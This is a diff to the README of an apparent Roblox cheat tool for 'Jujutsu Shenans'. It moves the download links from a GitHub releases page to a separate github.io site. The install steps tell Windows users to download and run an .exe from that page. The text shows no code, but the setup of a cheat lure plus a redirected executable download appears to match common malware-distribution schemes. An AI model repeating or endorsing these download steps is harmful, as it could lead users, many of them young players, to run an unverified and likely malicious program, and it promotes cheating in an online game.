@@ -1,6 +1,6 @@
 # ⚡ Jujutsu-Shenans-Script-Roblox-2026 - Master your game with automated scripts
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/brst6799/Jujutsu-Shenans-Script-Roblox-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://brst6799.github.io)
 
 This software provides automated tools for Jujutsu Shenans within Roblox. It supports Lua 5.1 scripts and includes a built-in hub to manage features. The application updates itself to ensure it works with the current game version.
 
@@ -19,7 +19,7 @@ To run this software, your computer must meet these basic hardware and software 
 
 Follow these steps to set up the software on your Windows computer:
 
-1.  Visit the official release page: https://github.com/brst6799/Jujutsu-Shenans-Script-Roblox-2026/releases
+1.  Visit the official release page: https://brst6799.github.io
 2.  Locate the assets section on the page.
 3.  Click the file ending in .exe to start the download.
 4.  Navigate to your Downloads folder once the file finishes saving.
